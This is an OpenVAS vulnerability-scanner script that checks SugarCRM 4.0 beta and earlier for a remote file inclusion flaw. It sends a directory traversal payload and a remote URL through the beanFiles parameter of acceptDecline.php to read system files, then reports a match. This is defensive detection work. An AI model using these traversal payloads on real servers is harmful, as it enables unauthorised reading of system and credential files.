###############################################################################
# OpenVAS Vulnerability Test
# $Id: sugarcrm_remote_file_inclusion.nasl 12007 2018-10-22 07:43:49Z cfischer $
#
# SugarCRM <= 4.0 beta Remote File Inclusion Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2005 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:sugarcrm:sugarcrm";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20286");
  script_version("$Revision: 12007 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 09:43:49 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2005-4087", "CVE-2005-4086");
  script_bugtraq_id(15760);
  script_name("SugarCRM <= 4.0 beta Remote File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2005 Ferdy Riphagen");
  script_dependencies("gb_sugarcrm_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("sugarcrm/installed");

  script_xref(name:"URL", value:"http://retrogod.altervista.org/sugar_suite_40beta.html");
  script_xref(name:"URL", value:"https://marc.info/?l=bugtraq&m=113397762406598&w=2");

  script_tag(name:"solution", value:"Upgrade to Sugar Suite version 3.5.1e and/or disable PHP's
  'register_globals' setting.");

  script_tag(name:"summary", value:"The version of SugarCRM installed on the remote host does not
  properly sanitize user input in the 'beanFiles[]' parameter in the 'acceptDecline.php' file.");

  script_tag(name:"impact", value:"A attacker can use this flaw to display sensitive information and to
  include malicious code which can be used to execute arbitrary commands.

  This vulnerability exists if 'register_globals' is enabled.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  string[0] = "../../../../../../../../" + file;
  string[1] = string("http://", get_host_name(), "/robots.txt");
  pat =  pattern + "|User-agent:";

  for(exp = 0; string[exp]; exp++) {
    url = string(dir, "/acceptDecline.php?beanFiles[1]=", string[exp], "&beanList[1]=1&module=1");
    if (http_vuln_check(port: port, url: url, pattern: pat, check_header: TRUE)) {
      report = report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(0);